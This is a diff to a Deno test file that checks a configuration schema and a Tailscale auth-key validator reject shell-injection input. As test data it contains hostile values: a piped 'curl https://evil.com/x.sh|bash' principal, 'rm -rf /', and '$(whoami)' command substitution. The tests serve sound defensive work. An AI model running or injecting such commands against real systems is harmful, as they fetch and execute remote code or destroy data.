@@ -1,5 +1,6 @@
-import { assertEquals, assertStringIncludes } from "@std/assert";
+import { assertEquals, assertStringIncludes, assertThrows } from "@std/assert";
 import {
+  assertTailnetAuthKey,
   buildEnsureAccessTokenCmd,
   buildEnsureWorkerTokenCmd,
   buildServeFlags,
@@ -163,4 +164,44 @@ Deno.test("buildEnsureWorkerTokenCmd revokes-then-recreates an existing token", 
     cmd,
     "swamp vault put exe-dev enroll-token-swamp-workers --yes",
   );
+});
+
+Deno.test("adminPrincipal regex rejects shell-injection via pipe", () => {
+  const schema = model.globalArguments;
+  // A piped principal must NOT validate (the adversarial finding).
+  const bad = schema.safeParse({
+    adminPrincipal: "user:alice|curl https://evil.com/x.sh|bash",
+    datastoreConfig: "{}",
+    tokenVault: "exe-dev",
+  });
+  assertEquals(bad.success, false, "piped principal must be rejected");
+  // A legitimate principal validates.
+  const good = schema.safeParse({
+    adminPrincipal: "user:alice",
+    datastoreConfig: "{}",
+    tokenVault: "exe-dev",
+  });
+  assertEquals(good.success, true, "plain user:<id> must validate");
+});
+
+Deno.test("tokenVault regex rejects names with shell metacharacters", () => {
+  const schema = model.globalArguments;
+  for (const bad of ["exe dev", "exe;rm -rf /", "exe|bad", "exe$(x)"]) {
+    const r = schema.safeParse({
+      adminPrincipal: "user:alice",
+      datastoreConfig: "{}",
+      tokenVault: bad,
+    });
+    assertEquals(r.success, false, `tokenVault "${bad}" must be rejected`);
+  }
+});
+
+Deno.test("assertTailnetAuthKey accepts tskey, rejects injection", () => {
+  assertEquals(
+    assertTailnetAuthKey("tskey-auth-k1AbC_de-f2"),
+    "tskey-auth-k1AbC_de-f2",
+  );
+  assertThrows(() => assertTailnetAuthKey("tskey-auth-k1$(whoami)"));
+  assertThrows(() => assertTailnetAuthKey("not-a-key"));
+  assertThrows(() => assertTailnetAuthKey(undefined));
 });
